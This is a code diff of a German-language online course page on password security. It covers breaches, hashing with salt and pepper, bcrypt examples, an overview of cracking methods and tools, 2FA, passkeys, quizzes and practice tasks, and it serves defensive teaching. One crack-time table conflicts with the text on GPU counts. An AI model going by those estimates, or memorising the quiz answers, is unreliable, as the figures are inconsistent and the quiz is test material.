+              Du hörst ständig von Datenleaks. Aber wie passiert das konkret? Drei Hauptwege:<br><br>
+              <strong>1. Datenbank-Hack</strong><br>
+              Angreifer dringt durch eine Lücke (z.B. SQL Injection) ins Backend ein und kopiert die Users-Tabelle. Wenn die Passwörter dort im Klartext oder als MD5 stehen, hat er sie sofort.<br><br>
+              <strong>2. Phishing</strong><br>
+              Du gibst dein Passwort selbst auf einer gefälschten Seite ein. <em>Niemand</em> hat irgendeine Lücke ausgenutzt — der Angreifer wartet auf der falschen Seite.<br><br>
+              <strong>3. Credential Stuffing</strong><br>
+              Aus früheren Leaks hat der Angreifer dein Passwort z.B. von "kleiner-shop.de". Er probiert dieselbe Email + Passwort-Kombi bei Gmail, Amazon, PayPal, Instagram. Wenn du dasselbe Passwort genutzt hast — Pech.<br><br>
+              <strong>Das macht das Re-use von Passwörtern zur größten Sünde.</strong> 1 Leak → 50 kompromittierte Accounts.
             </div>
           </div>
-          <div class="content-card animate-in" style="animation-delay:0.08s">
-            <div class="card-label">Warum einfache Hashes (MD5, SHA1) gefährlich sind</div>
+
+          <div class="content-card animate-in" style="animation-delay:0.07s">
+            <div class="card-label">Die größten Passwort-Leaks der Geschichte</div>
             <div class="explanation">
-              MD5 und SHA1 sind <strong>schnell</strong> — ein Angreifer kann pro Sekunde Milliarden Varianten durchprobieren. Für Passwörter brauchst du <strong>langsame</strong> Algorithmen:<br><br>
-              • <code>bcrypt</code> — Klassiker, sehr verbreitet<br>
-              • <code>argon2</code> — Gewinner des Password Hashing Competition 2015<br>
-              • <code>scrypt</code> — besonders speicherintensiv (schützt vor GPU-Angriffen)
+              <strong>Yahoo (2013-2014, bekannt 2016)</strong><br>
+              <em>3 Milliarden Konten</em> — der größte Leak aller Zeiten. Yahoo hatte MD5 mit Salt benutzt — knackbar.<br><br>
+              <strong>LinkedIn (2012)</strong><br>
+              167 Mio Passwörter mit unsalted SHA-1. Hashes wurden 2016 verkauft — innerhalb von Tagen waren ~90% geknackt.<br><br>
+              <strong>RockYou (2009)</strong><br>
+              32 Mio Passwörter im KLARTEXT geleakt. Die Liste <code>rockyou.txt</code> ist bis heute DAS Standard-Wörterbuch für Brute-Force-Angriffe — in jeder Pentester-Distribution dabei.<br><br>
+              <strong>Adobe (2013)</strong><br>
+              153 Mio Konten. Adobe hatte alle Passwörter mit demselben (!) statischen Schlüssel verschlüsselt — und jeder User hatte einen "Passwort-Hinweis" gespeichert. Riesiger Spaß für Angreifer.<br><br>
+              <strong>Collection #1-5 (2019)</strong><br>
+              <em>2,2 Milliarden</em> Email+Passwort-Kombis aus 252 verschiedenen Hacks zusammengelegt. Heute Standard-Material für Credential-Stuffing-Bots.<br><br>
+              <strong>Faustregel:</strong> wenn deine Email irgendwo registriert ist, ist sie WAHRSCHEINLICH in mindestens einem Leak. Check auf <code>haveibeenpwned.com</code>.
             </div>
-            <div class="code-block" style="margin-top:14px">
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.1s">
+            <div class="card-label">Hash vs. Verschlüsselung — der fundamentale Unterschied</div>
+            <div class="explanation">
+              Werden ständig verwechselt — aber sie machen unterschiedliche Dinge:<br><br>
+              <strong>Verschlüsselung</strong> ist <em>umkehrbar</em>. Mit dem Key kannst du den Klartext zurückbekommen. Für Nachrichten die der Empfänger lesen soll (z.B. Email, HTTPS-Verkehr).<br><br>
+              <strong>Hash</strong> ist eine <em>Einweg-Funktion</em>. Aus "geheim123" wird ein fester Wert wie <code>$2b$12$abc...XYZ</code>. Es gibt keinen Weg zurück. Selbst mit allen Daten der Welt kannst du den Hash nicht "entschlüsseln".
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Eigenschaften eines guten Hashes</span></div>
+              <div class="code-pre">  ✓ DETERMINISTISCH    Gleicher Input → immer gleicher Output
+  ✓ EINWEG             Aus dem Hash kommst du nicht zum Input
+  ✓ KOLLISIONSRESISTENT Zwei Inputs → praktisch nie gleicher Hash
+  ✓ AVALANCHE-EFFEKT   1 Bit Änderung → komplett anderer Hash
+  ✓ FESTE LÄNGE        Egal wie lang Input — Hash ist gleich lang
+
+  hash("Hallo")    = 2c1743a39...   (64 Zeichen bei SHA-256)
+  hash("hallo")    = d9b8...        (komplett anders trotz 1 Zeichen)
+  hash("Roman 100k Zeichen") = ebc1... (auch 64 Zeichen)</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Warum dann hashen statt verschlüsseln?</strong> Damit selbst der Server-Betreiber dein Passwort nicht kennt. Bei Login wird das eingegebene Passwort gehasht und mit dem gespeicherten Hash <em>verglichen</em>. Es wird nirgends "entschlüsselt".
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.13s">
+            <div class="card-label">Warum MD5 und SHA-1 für Passwörter tot sind</div>
+            <div class="explanation">
+              MD5 (1992) und SHA-1 (1995) sind <strong>schnell</strong> — designt um große Datenmengen schnell zu hashen (z.B. Datei-Checksums). Für Passwörter ist das ein Problem.<br><br>
+              <strong>Konkrete Zahlen (Stand 2026):</strong><br>
+              • Eine moderne GPU (z.B. RTX 4090) macht <strong>200 Milliarden MD5-Hashes pro Sekunde</strong><br>
+              • Mit 8 GPUs in einer Cracking-Rig: 1,6 Billionen Hashes/s<br>
+              • Ein 8-stelliges Passwort (nur Buchstaben+Zahlen) hat ~218 Billionen Möglichkeiten<br>
+              • → Gesamten Suchraum durchprobiert in <strong>~2 Minuten</strong>
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Wie schnell knackt eine Cracking-Rig?</span></div>
+              <div class="code-pre">  Algorithmus     8-stelliges PW       12-stelliges PW
+  ─────────────   ─────────────────    ─────────────────
+  MD5             ~2 Minuten            Jahrhunderte (langsamer)
+  SHA-1           ~3 Minuten            Jahrhunderte
+  bcrypt(12)      ~2 Wochen             Praktisch unmöglich
+  argon2id        ~1 Monat              Praktisch unmöglich
+
+  (Schätzungen, mit 1 RTX 4090. In der Realität haben Profis viele GPUs.)</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.16s">
+            <div class="card-label">Rainbow Tables — vorberechnete Hash-Tabellen</div>
+            <div class="explanation">
+              Wenn ein Hash deterministisch ist, kann man ihn vorberechnen. Eine <strong>Rainbow Table</strong> ist eine riesige Datenbank: <em>häufiges Passwort → MD5-Hash</em>. Findet man bei einem Leak einen MD5-Hash, schaut man einfach nach.<br><br>
+              <strong>Lösung: Salt</strong> — vor dem Hashen wird ein zufälliger Wert (der "Salt") an das Passwort gehängt. Der Salt ist pro User unterschiedlich.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Salt</span></div>
+              <div class="code-pre"><span class="cm"># Ohne Salt:</span>
+  MD5(<span class="st">"passwort123"</span>)             = <span class="st">"482c811da5d5..."</span>
+  <span class="cm"># Anna und Ben haben dasselbe PW → derselbe Hash
+  # → Rainbow Table findet beide sofort.</span>
+
+<span class="cm"># Mit Salt (random pro User):</span>
+  MD5(<span class="st">"passwort123"</span> + <span class="st">"salt_anna_xy7"</span>) = <span class="st">"a8d3..."</span>
+  MD5(<span class="st">"passwort123"</span> + <span class="st">"salt_ben_q9k"</span>)  = <span class="st">"4b21..."</span>
+  <span class="cm"># Beide Hashes komplett unterschiedlich.
+  # Rainbow Tables nutzlos — Angreifer muss für JEDEN User
+  # einzeln cracken. Macht Massen-Cracking unwirtschaftlich.</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Wichtig:</strong> der Salt ist KEIN Geheimnis. Er wird zusammen mit dem Hash gespeichert. Sein einziger Zweck ist <em>jeder Hash ist anders</em>. Bcrypt/Argon2 generieren den Salt automatisch und speichern ihn im Hash-String.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.19s">
+            <div class="card-label">Pepper — der zweite, geheime Salt</div>
+            <div class="explanation">
+              Ein optionaler zusätzlicher Schutz: ein <strong>Pepper</strong> ist ein einzelner geheimer Wert für die ganze App. Er wird beim Hashing dazu addiert, aber NICHT in der Datenbank gespeichert (sondern z.B. in einer <code>.env</code>-Datei oder einem Secret-Manager).<br><br>
+              <strong>Wirkung:</strong> wenn nur die DB geleakt wird (nicht der App-Server), kann der Angreifer keine Hashes cracken — der Pepper fehlt ihm.
+            </div>
+            <div class="code-block" style="margin-top:10px">
               <div class="code-block-header"><span class="code-lang">python</span></div>
+              <div class="code-pre"><span class="kw">import</span> bcrypt, os
+
+PEPPER = os.<span class="fn">environ</span>[<span class="st">"PEPPER"</span>].encode()   <span class="cm"># aus .env</span>
+
+<span class="kw">def</span> <span class="fn">hash_passwort</span>(passwort):
+    <span class="kw">return</span> bcrypt.<span class="fn">hashpw</span>(passwort.encode() + PEPPER, bcrypt.<span class="fn">gensalt</span>(<span class="num">12</span>))
+
+<span class="kw">def</span> <span class="fn">prüfe_passwort</span>(passwort, hash):
+    <span class="kw">return</span> bcrypt.<span class="fn">checkpw</span>(passwort.encode() + PEPPER, hash)</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.22s">
+            <div class="card-label">Die richtige Wahl — bcrypt, scrypt, argon2</div>
+            <div class="explanation">
+              Drei moderne Passwort-Hashing-Algorithmen — alle <em>absichtlich langsam</em>. Du kannst nicht falsch wählen, alle sind gut. Nur: <strong>NIE rohes MD5 oder SHA-256!</strong>
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Vergleich</span></div>
+              <div class="code-pre">  bcrypt
+  ─────────────────────────────────────────────────────────────
+  Erfunden     1999, sehr verbreitet
+  Stärken      Battle-tested, in jeder Sprache verfügbar
+  Schwächen    Limit auf 72 Bytes Passwort, schwächer gegen GPU
+  Wann nehmen  Default-Wahl wenn du nicht weißt was du willst
+
+  scrypt
+  ─────────────────────────────────────────────────────────────
+  Erfunden     2009, von Colin Percival
+  Stärken      Speicher-intensiv → schwer auf GPU/ASIC zu bauen
+  Schwächen    Etwas weniger verbreitet
+  Wann nehmen  Wenn du GPU-Cracking besonders fürchtest
+
+  argon2 (id-Variante)
+  ─────────────────────────────────────────────────────────────
+  Erfunden     2015, Gewinner Password Hashing Competition
+  Stärken      Modernster Ansatz, optimal gegen alle Angriffe
+  Schwächen    Etwas weniger Bibliotheks-Reife (ändert sich)
+  Wann nehmen  Wenn du heute neu startest — Empfehlung des OWASP</span></div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.25s">
+            <div class="card-label">bcrypt in Python — vollständiges Beispiel</div>
+            <div class="code-block">
+              <div class="code-block-header"><span class="code-lang">python</span><button class="copy-btn" onclick="copyCode(this)"><i data-lucide="copy"></i>kopieren</button></div>
               <div class="code-pre"><span class="kw">import</span> bcrypt
 
-<span class="cm"># Registrierung</span>
-passwort = <span class="st">b"MeinStarkesPasswort!"</span>
-salt = bcrypt.<span class="fn">gensalt</span>(rounds=<span class="num">12</span>)   <span class="cm"># Kosten: 2^12 Operationen</span>
-hash = bcrypt.<span class="fn">hashpw</span>(passwort, salt)
-<span class="cm"># In Datenbank: nur den hash speichern, nie das Passwort</span>
+<span class="cm"># REGISTRIERUNG: Passwort hashen + speichern</span>
+<span class="kw">def</span> <span class="fn">register</span>(passwort: str) -> bytes:
+    salt = bcrypt.<span class="fn">gensalt</span>(rounds=<span class="num">12</span>)         <span class="cm"># 2^12 = 4096 Iterationen</span>
+    hash = bcrypt.<span class="fn">hashpw</span>(passwort.encode(), salt)
+    <span class="kw">return</span> hash
+    <span class="cm"># Beispiel-Hash: $2b$12$Fz6mOQ...XYZ
+    # → in DB unter user.passwort_hash speichern</span>
 
-<span class="cm"># Login prüfen</span>
-<span class="kw">if</span> bcrypt.<span class="fn">checkpw</span>(eingabe, hash):
-    <span class="fn">print</span>(<span class="st">"Login erfolgreich"</span>)</div>
+<span class="cm"># LOGIN: Passwort prüfen</span>
+<span class="kw">def</span> <span class="fn">login</span>(passwort: str, gespeicherter_hash: bytes) -> bool:
+    <span class="kw">return</span> bcrypt.<span class="fn">checkpw</span>(passwort.encode(), gespeicherter_hash)
+
+<span class="cm"># Praxis</span>
+hash = <span class="fn">register</span>(<span class="st">"meinPasswort123"</span>)
+<span class="fn">print</span>(hash)
+<span class="fn">print</span>(<span class="fn">login</span>(<span class="st">"meinPasswort123"</span>, hash))   <span class="cm"># True</span>
+<span class="fn">print</span>(<span class="fn">login</span>(<span class="st">"falsch"</span>, hash))             <span class="cm"># False</span>
+
+<span class="cm"># Wichtig:
+# - rounds=12 ist 2026 ein guter Wert (~250ms pro Hash)
+# - Höhere rounds = sicherer, aber langsamer Login
+# - Salt wird automatisch generiert + im Hash gespeichert</span></div>
             </div>
           </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.28s">
+            <div class="card-label">Wie Angreifer Passwörter wirklich knacken</div>
+            <div class="explanation">
+              Wenn ein Angreifer eine Hash-Liste hat, geht er typischerweise so vor:<br><br>
+              <strong>1. Wörterbuch-Angriff (Dictionary Attack)</strong><br>
+              Probiert alle Wörter aus rockyou.txt + Permutationen ("password", "Password!", "P@ssw0rd"). Knackt 50-70% aller Passwörter binnen Stunden.<br><br>
+              <strong>2. Brute Force</strong><br>
+              Alle möglichen Kombinationen: a, b, c, ..., aa, ab, ... Funktioniert nur bei kurzen Passwörtern (≤8 Zeichen).<br><br>
+              <strong>3. Hybrid-Angriffe</strong><br>
+              Wörterbuch + Mutationen: "passwort" → "passwort1", "passwort!", "passwort123", "p4ssw0rt"...<br><br>
+              <strong>4. Mask-Angriff</strong><br>
+              Bekanntes Muster: "Vorname + 4 Zahlen" → probiert nur diese Form.<br><br>
+              <strong>5. Credential Stuffing</strong><br>
+              Email + Passwort aus früheren Leaks bei anderen Diensten ausprobieren — kein Cracken nötig.<br><br>
+              <strong>Tools:</strong> hashcat, John the Ripper, hydra (für Online-Brute-Force).
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.31s">
+            <div class="card-label">Was macht ein gutes Passwort aus?</div>
+            <div class="explanation">
+              <strong>Länge schlägt Komplexität.</strong> Eine alte NIST-Empfehlung (komplexe 8 Zeichen mit Sonderzeichen) ist überholt — neue Empfehlung (NIST SP 800-63B):<br><br>
+              ✓ <strong>Mindestens 12 Zeichen</strong>, besser 16+<br>
+              ✓ <strong>Passphrase statt Passwort</strong> — z.B. <code>korrekt-pferd-batterie-klammer</code> (XKCD, leicht zu merken, schwer zu knacken)<br>
+              ✓ <strong>Pro Account ein anderes Passwort</strong> (verhindert Credential Stuffing)<br>
+              ✓ <strong>Gegen bekannte Leaks geprüft</strong> (haveibeenpwned)<br><br>
+              ✗ <strong>NICHT</strong> erzwingen: regelmäßiger Passwortwechsel (User wählen schwächere PWs)<br>
+              ✗ <strong>NICHT</strong> verbieten: lange Passwörter (manche Apps limitieren auf 16 Zeichen — verboten)<br>
+              ✗ <strong>NICHT</strong> verbieten: Sonderzeichen oder Leerzeichen<br>
+              ✗ <strong>NICHT</strong> abschalten: Passwort-Manager (autocomplete="off" auf Login-Forms ist eine Sünde)
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">XKCD-Methode (legendär)</span></div>
+              <div class="code-pre">  "Tr0ub4dor&3"        — kurz, schwer zu merken, in ~3 Tagen geknackt
+  "correct horse battery staple"  — leicht zu merken, ~550 Jahre
+
+  Mehr Entropie durch Länge schlägt Komplexität durch Sonderzeichen.</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.34s">
+            <div class="card-label">Passwort-Manager — die einzig vernünftige Lösung</div>
+            <div class="explanation">
+              Du kannst dir nicht 100 unterschiedliche 16-stellige Passwörter merken. Niemand kann das. Lösung: <strong>Passwort-Manager</strong>.<br><br>
+              <strong>Wie es funktioniert:</strong> Du merkst dir EIN starkes Master-Passwort. Der Manager generiert für jeden Account ein zufälliges 30-stelliges Passwort und speichert es verschlüsselt. Beim Login auf einer Webseite füllt er es automatisch ein.<br><br>
+              <strong>Empfehlungen:</strong><br>
+              • <strong>Bitwarden</strong> — Open Source, kostenlos, Cloud-Sync<br>
+              • <strong>1Password</strong> — kommerziell, beste UX (~3€/Monat)<br>
+              • <strong>KeePassXC</strong> — komplett offline, Open Source<br>
+              • <strong>iCloud Keychain</strong> / <strong>Google Password Manager</strong> — eingebaut, gut für Anfänger<br><br>
+              <strong>"Aber dann ist alles weg wenn der Manager gehackt wird!"</strong> — alle Daten sind clientseitig mit deinem Master-Passwort verschlüsselt. Selbst wenn der Anbieter gehackt wird, sieht der Angreifer nur Verschlüsseltes. Bitwarden, 1Password & Co haben Audits dazu.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.37s">
+            <div class="card-label">2FA / MFA — der zweite Faktor</div>
+            <div class="explanation">
+              Selbst wenn dein Passwort geleakt wird: ohne den zweiten Faktor kommt der Angreifer nicht rein.<br><br>
+              <strong>Stark → schwach geordnet:</strong><br><br>
+              <strong>1. Hardware-Token (FIDO2 / WebAuthn)</strong><br>
+              Z.B. YubiKey. Physisches USB-Gerät, fast unmöglich zu phishen, kostet ~25€.<br><br>
+              <strong>2. Authenticator-App (TOTP)</strong><br>
+              Google Authenticator, Authy, 2FAS. Generiert 6-stelligen Code alle 30 Sekunden. Kostenlos, offline. Empfehlung für die meisten Accounts.<br><br>
+              <strong>3. Push-Notifications</strong><br>
+              Die App fragt: "Login-Versuch in Berlin — du?". Bequem, aber anfällig für "MFA fatigue" (Spam bis User zustimmt).<br><br>
+              <strong>4. Email-Code</strong><br>
+              Schwach — wenn Email-Account kompromittiert ist, ist alles vorbei.<br><br>
+              <strong>5. SMS-Code</strong><br>
+              <em>Schwächste Form</em> — anfällig für SIM-Swapping. Trotzdem besser als nichts.<br><br>
+              <strong>Pflicht für:</strong> Email, Bank, GitHub, Domain-Anbieter, Cloud-Konten. Andere Accounts: stark empfohlen.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.4s">
+            <div class="card-label">Passkeys — die Zukunft (heute schon nutzbar)</div>
+            <div class="explanation">
+              <strong>Passkeys</strong> sind passwortloser Login mit kryptografischen Schlüsseln. Apple, Google, Microsoft pushen das gemeinsam — auf Basis von <em>FIDO2 / WebAuthn</em>.<br><br>
+              <strong>Wie es funktioniert:</strong> bei der Registrierung erstellt dein Gerät ein Schlüsselpaar (privat + öffentlich). Den öffentlichen Schlüssel bekommt die Webseite, den privaten behältst du. Beim Login signiert dein Gerät eine Challenge — die Webseite prüft mit dem öffentlichen Schlüssel.<br><br>
+              <strong>Vorteile:</strong><br>
+              ✓ Kein Passwort → nichts zu phishen, nichts zu cracken<br>
+              ✓ Phishing-resistent (Schlüssel funktioniert nur auf der echten Domain)<br>
+              ✓ Keine Datenleak-Sorge — die Webseite hat nur deinen öffentlichen Schlüssel<br>
+              ✓ Eingebaut in iOS, Android, macOS, Windows<br><br>
+              <strong>Du kannst heute Passkeys nutzen bei:</strong> Google, Apple, Microsoft, Amazon, GitHub, eBay, PayPal, viele andere. Probier's aus — meist unter "Sicherheit" → "Passkeys hinzufügen".
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.43s">
+            <div class="card-label">Defensive Best Practices für Entwickler</div>
+            <div class="explanation">
+              <strong>Wenn du eine App mit User-Login baust:</strong><br><br>
+              ✓ <strong>bcrypt/argon2</strong> für Passwort-Hashes (rounds=12 minimum)<br>
+              ✓ <strong>Optional Pepper</strong> aus Environment-Variable<br>
+              ✓ <strong>Rate-Limiting</strong> — max 5 Login-Versuche pro Minute pro IP<br>
+              ✓ <strong>Account-Lockout nach Versuchen</strong> — aber Vorsicht vor DoS<br>
+              ✓ <strong>Passwort-Stärke prüfen</strong> beim Setzen (Länge minimal 12, gegen Top-1000-Liste prüfen)<br>
+              ✓ <strong>Generische Fehlermeldung</strong>: "Email oder Passwort falsch" — niemals "Email existiert nicht"<br>
+              ✓ <strong>Login-Versuche loggen</strong> — IP, Zeit, Erfolg/Misserfolg<br>
+              ✓ <strong>Email bei Login von neuem Gerät</strong> — "Hallo, jemand hat sich aus Berlin eingeloggt"<br>
+              ✓ <strong>2FA anbieten</strong> — TOTP-Apps sind einfach (per <code>pyotp</code>)<br>
+              ✓ <strong>Passwort-Reset über Email-Link</strong> mit Ablaufzeit (15 Min) und Single-Use<br>
+              ✓ <strong>Bei sensiblen Aktionen</strong> (Email ändern, Konto löschen) Passwort neu abfragen<br>
+              ✓ <strong>Session-Tokens nach Passwort-Wechsel invalidieren</strong><br><br>
+              <strong>Profi-Empfehlung:</strong> nutze einen <strong>Auth-Provider</strong> (Auth0, Clerk, Supabase Auth, Firebase Auth) — die haben das alles richtig gemacht. Selbst-Implementierung ist eine häufige Fehlerquelle.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.46s">
+            <div class="card-label">Was tun wenn dein Account gehackt wurde?</div>
+            <div class="explanation">
+              <strong>Sofort-Maßnahmen:</strong><br>
+              1. <strong>Passwort ändern</strong> — beim betroffenen Dienst und allen wo du dasselbe nutzt<br>
+              2. <strong>2FA aktivieren</strong> falls noch nicht<br>
+              3. <strong>Aktive Sessions ausloggen</strong> (in den Account-Einstellungen)<br>
+              4. <strong>Verbundene Apps prüfen</strong> — fremde OAuth-Apps entfernen<br>
+              5. <strong>Email-Account besonders prüfen</strong> — wer den hat, hat alles<br>
+              6. <strong>Bank/Kreditkarte beobachten</strong> falls verknüpft<br><br>
+              <strong>Vorsorge — regelmäßig (alle 3 Monate):</strong><br>
+              • Auf <code>haveibeenpwned.com</code> deine Email checken<br>
+              • Aktive Sessions in wichtigen Accounts prüfen<br>
+              • Apps die du nicht mehr nutzt → Account löschen oder zumindest abmelden
+            </div>
+          </div>
+
           ${quiz('q_pwd1', 'Warum ist MD5 für Passwörter ungeeignet?', [
             {t:'MD5 funktioniert nicht in Python', correct:false, why:'MD5 gibt es in fast jeder Sprache — das ist nicht das Problem.'},
             {t:'MD5 ist zu schnell — Angreifer können Milliarden Hashes pro Sekunde testen', correct:true, why:'Genau! Für Passwörter brauchst du langsame Algorithmen wie bcrypt oder argon2, die absichtlich Rechenzeit brauchen.'},
             {t:'MD5 produziert zu lange Hashes', correct:false, why:'MD5 ist im Gegenteil recht kurz (128 bit). Länge ist nicht das Problem.'},
             {t:'MD5 kostet Geld', correct:false, why:'MD5 ist frei verfügbar.'},
           ])}
-          <div class="boss-card animate-in" style="animation-delay:0.15s">
-            <div class="boss-label-text"><i data-lucide="sparkles"></i>Praxisaufgabe</div>
-            <div class="boss-title">Deine erste CTF-Challenge</div>
-            <div class="boss-desc">Registriere dich kostenlos bei <code>picoCTF.org</code> und löse 3 Einsteiger-Challenges aus der Kategorie "General Skills" oder "Web Exploitation". Das sind legale Übungsaufgaben mit echten Schwachstellen.</div>
+          ${quiz('q_pwd2', 'Was ist ein Salt beim Hashing?', [
+            {t:'Eine geheime Zutat die der Angreifer nicht kennt', correct:false, why:'Verwechselt mit Pepper. Salts sind NICHT geheim — sie werden mit dem Hash gespeichert.'},
+            {t:'Ein zufälliger Wert pro User der vor dem Hashen ans Passwort gehängt wird', correct:true, why:'Genau! Der Salt sorgt dafür dass zwei User mit gleichem Passwort unterschiedliche Hashes haben — macht Rainbow Tables nutzlos.'},
+            {t:'Ein Algorithmus zum Verschlüsseln', correct:false, why:'Salts haben nichts mit Verschlüsselung zu tun.'},
+            {t:'Ein Captcha-System', correct:false, why:'Erfunden — Captchas sind etwas ganz anderes.'},
+          ])}
+          ${quiz('q_pwd3', 'Was ist die größte Gefahr bei der Wiederverwendung von Passwörtern?', [
+            {t:'Es ist langweilig', correct:false, why:'Ja, aber das ist kein Sicherheitsrisiko.'},
+            {t:'Credential Stuffing — wird ein Account geleakt, kann der Angreifer alle deine anderen Accounts ausprobieren', correct:true, why:'Genau! Aus Leaks weiß der Angreifer dein Passwort z.B. von einem kleinen Forum. Probiert dieselbe Kombination bei Gmail, Amazon, PayPal — wenn du wiederverwendet hast: alle weg.'},
+            {t:'Passwort wird langsamer', correct:false, why:'Performance hat damit nichts zu tun.'},
+            {t:'Du vergisst es schneller', correct:false, why:'Eher umgekehrt — aber das ist kein Sicherheitsrisiko.'},
+          ])}
+          ${quiz('q_pwd4', 'Welcher 2FA-Faktor ist der STÄRKSTE?', [
+            {t:'SMS-Code', correct:false, why:'SMS ist die SCHWÄCHSTE Form — anfällig für SIM-Swapping. Trotzdem besser als nichts.'},
+            {t:'Email-Code', correct:false, why:'Schwach — wenn Email kompromittiert, alles weg.'},
+            {t:'Hardware-Token (YubiKey, FIDO2/WebAuthn)', correct:true, why:'Genau! Physischer Schlüssel, phishing-resistent, der Goldstandard. Kostet ~25€ aber unschlagbare Sicherheit.'},
+            {t:'TOTP-Authenticator-App', correct:false, why:'Sehr gut! Aber Hardware-Token sind noch eine Stufe darüber (phishing-resistent dank kryptografischer Bindung an die Domain).'},
+          ])}
+          ${quiz('q_pwd5', 'Was sind Passkeys?', [
+            {t:'Eine neue Art Passwort mit mehr Sonderzeichen', correct:false, why:'Im Gegenteil — Passkeys sind komplett OHNE Passwort.'},
+            {t:'Passwortloser Login mit kryptografischen Schlüsseln (öffentlich/privat)', correct:true, why:'Genau! Dein Gerät hält den privaten Schlüssel, die Webseite den öffentlichen. Phishing-resistent und immun gegen Datenleaks. Bei Google/Apple/Microsoft/GitHub bereits nutzbar.'},
+            {t:'Ein neuer Passwort-Manager', correct:false, why:'Passkeys sind eine Authentifizierungs-Methode, kein Passwort-Manager.'},
+            {t:'Hardware-Token wie YubiKeys', correct:false, why:'Passkeys NUTZEN ähnliche Krypto, aber sind in deinem Telefon/Computer eingebaut — kein extra Gerät nötig.'},
+          ])}
+
+          <div class="boss-card animate-in" style="animation-delay:0.5s">
+            <div class="boss-label-text"><i data-lucide="trophy"></i>Praxisaufgaben & Selbsttest</div>
+            <div class="boss-title">Sicherheits-Hygiene + erste CTF-Challenges</div>
+            <div class="boss-desc">
+              <strong>Über deine eigenen Accounts:</strong><br>
+              <strong>1.</strong> Geh auf <code>haveibeenpwned.com</code> und checke deine Haupt-Email — wie oft warst du bisher in Leaks?<br>
+              <strong>2.</strong> Installiere einen Passwort-Manager (Bitwarden ist gratis), generiere für deine 5 wichtigsten Accounts neue lange zufällige Passwörter.<br>
+              <strong>3.</strong> Aktiviere 2FA bei: Email, Bank, GitHub, Steam, Apple/Google. Mit TOTP-App, nicht SMS.<br>
+              <strong>4.</strong> Setze einen Passkey ein bei mindestens einem Account (z.B. Google).<br><br>
+              <strong>Praktisches Hacking (legal):</strong><br>
+              <strong>5.</strong> Registriere dich kostenlos bei <code>picoCTF.org</code>, löse 3 Einsteiger-Challenges aus "General Skills" oder "Cryptography".<br>
+              <strong>6.</strong> Auf <strong>HackTheBox Academy</strong> gibt's einen kostenlosen Modul "Password Attacks" — sehr lehrreich.<br>
+              <strong>7.</strong> Lade dir <code>hashcat</code> herunter und cracke einen MD5-Hash deiner Wahl (z.B. <code>e10adc3949ba59abbe56e057f20f883e</code> — googel den Hash auch mal). Verstehe wie schnell das geht.<br><br>
+              <strong>Als Entwickler:</strong><br>
+              <strong>8.</strong> Bau ein Mini-Login mit Flask + bcrypt. Speichere absichtlich erst MD5, dann migriere auf bcrypt — verstehe den Unterschied im Code.<br><br>
+              <strong>WICHTIG:</strong> alles nur auf eigenen Accounts und legalen Test-Plattformen. Die schönsten Tools werden zu Verbrechen wenn du sie gegen fremde Systeme einsetzt.
+            </div>
           </div>
         `
       }
